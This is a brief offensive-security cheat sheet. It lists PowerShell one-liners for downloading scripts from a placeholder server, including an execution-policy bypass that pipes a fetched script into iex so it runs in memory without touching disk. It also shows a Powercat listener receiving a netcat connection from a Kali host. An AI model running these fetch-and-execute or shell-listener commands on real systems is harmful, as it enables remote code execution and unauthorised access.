# Powershell Kungfu

## Powershell Download

There is nothing on disk in this option

```text
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://server/file.ps1')|iex"
```

PowerShell one liner download \(any version\)

```text
(New-Object System.Net.WebClient).DownloadFile("http://server/file.ps1", "file.ps1")  
```

PowerShell one liner download \(4.0 & 5.0\)

```text
Invoke-WebRequest "http://server/file.ps1" -OutFile "file.ps1"  
```

## Powercat

Download script from here : [https://github.com/besimorhino/powercat/blob/master/powercat.ps1](https://github.com/besimorhino/powercat/blob/master/powercat.ps1)

import and start listener

```text
PS C:\Users\testuser\Desktop\share> . .\powercat.ps1
PS C:\Users\testuser\Desktop\share> powercat -l -p 4444
i connected from kali
```

connect from another device

```text
┌──(kali㉿kali)-[~/Desktop]
└─$ nc 192.168.200.112 4444                                    
i connected from kali
```

